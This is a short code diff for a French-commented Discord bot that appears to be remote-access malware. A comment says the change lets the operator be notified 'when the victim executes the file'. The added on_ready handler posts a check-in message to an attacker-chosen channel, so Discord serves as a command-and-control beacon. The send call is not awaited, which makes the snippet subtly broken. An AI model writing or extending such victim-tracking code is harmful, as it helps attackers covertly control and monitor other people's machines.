@@ -10,6 +10,11 @@ from discord.ext import commands
 ton_id = 1234567890
 ton_token = "TOKEN"
 
+
+# Pour être averti quand la victime éxécute le fichier
+
+salon_id = 1234567890
+
 # Voulez-vous que le bot envoie un message quand il y a une erreur, ou qu'il l'ignore?
 
 ignore = False
@@ -21,6 +26,17 @@ private = True
 
 
 bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
+
+@bot.event
+async def on_ready():
+    for guild in bot.guilds:
+        for channel in guild.channels:
+            if channel.id == salon_id:
+                try:
+                    channel.send("Je suis là!")
+                except:
+                    pass
+                return
 
 @bot.listen()
 async def on_message(mess):
